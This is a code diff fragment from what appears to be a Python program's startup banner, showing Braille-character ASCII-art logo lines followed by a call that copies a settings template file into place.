+ ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣬⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢛⣉⣉⣡⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣶⣄⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⣁⣤⣶⡿⣿⣿⠉⠻⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢻⣿⣧⡀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⣠⣶⣿⡟⠻⣿⠃⠈⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣧
+ ⢀⣀⣤⣴⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⢠⣾⣿⠉⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
+ ⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⡟
+ ⠀⠀⠀⠀⠉⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡟⠁
+ ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⣴⣆⢀⣴⣆⠀⣼⣆⠀⠀⣶⣶⣶⣶⣶⣶⣶⣶⣾⣿⣿⠿⠋⠀⠀
+ ⠀⠀⠀⣼⣿⣿⣿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠓⠒⠒⠚⠛⠛⠛⠛⠛⠛⠛⠛⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀
+ ⠀⠀⠀⣿⣿⠟⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣶⡀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣷⡄⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⣆⠀⢰⣿⣿⣿⠀⠀⠀⣿⣿⣿
+ ⠀⠀⠀⠘⠁⠀⠀⠀⢸⣿⣿⡿⠛⠛⢻⣿⣿⡇⠀⢸⣿⣿⡿⠛⠛⢿⣿⣿⡇⠀⢸⣿⣿⡿⠛⠛⢻⣿⣿⣿⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠸⠿⠿⠟⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣧⣤⣤⣼⣿⣿⡇⠀⢸⣿⣿⣧⣤⣤⣼⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢀⣀⣀⣀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠉⠉⠉⠉⠀⠀⠀⢸⣿⣿⡏⠉⠉⢹⣿⣿⡇⠀⢸⣿⣿⣇⣀⣀⣸⣿⣿⣿⠀⢸⣿⣿⣿⣀⣀⣀⣿⣿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⡟
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠘⠛⠛⠃⠀⠀⠉⠛⠛⠛⠛⠛⠛⠋⠀⠀⠀⠀⠙⠛⠛⠛⠛⠛⠉⠀
 """)
 
                     configure_settings.copy_settings_template_into_settings_file_if_not_present()
